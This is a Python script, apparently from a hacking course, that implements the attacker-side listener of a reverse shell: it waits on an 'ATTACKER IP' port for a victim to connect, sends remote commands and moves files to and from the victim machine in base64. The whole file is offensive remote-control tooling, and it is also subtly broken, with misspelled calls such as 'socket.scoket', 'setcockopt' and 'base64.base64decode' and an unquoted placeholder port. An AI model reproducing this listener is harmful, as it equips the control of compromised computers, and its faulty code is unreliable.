#Instead of calling Class from another program, Here I am going to call the class from within our code
#That is the only difference

import socket
import json
import base64

class Listener:

	def __init__(self, ip, port):
		listener = socket.scoket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setcockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		listener.bind((ip, port))
		listener.listen(0) #0 is backlog- i.e. number of connections that can be queued before the listener starts refusing connections

		print("Waiting for incoming connections")
		self.connection, address =listener.accept() #acc. to documentation accept() returns 2 value, the 1st is connection and 2nd is address
		print("We have been connected with "+ str(address))

	def reliable_send(self, data):
		json_data = json.dump(data)
		self.connection.send(json_data) #change this to self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = "" #make this json_data = b"" for python3
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_remotely(self, command):
		self.reliable_send(command)

		if command[0] == "exit":
			self.connection.close()
			exit() #exits the program

		return self.reliable_receive()

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.base64decode(content))
			return "download successful"

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.base64encode(file.read())


	def run(self):
		while True:
			command = raw_input(">>") #use input instead of raw_input for python 3
			command = command.split(" ")

			try:
				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append(file_content)

				result = self.execute_remotely(command)
				
				if command[0] == "download" and "Error" not in result:
					result = self.write_file(command[1], result)
			except Exception:
				result = "Error during command execution"
			print(result)

my_listener = Listener("ATTACKER IP", ATTCKER PORT)
my_listener.run()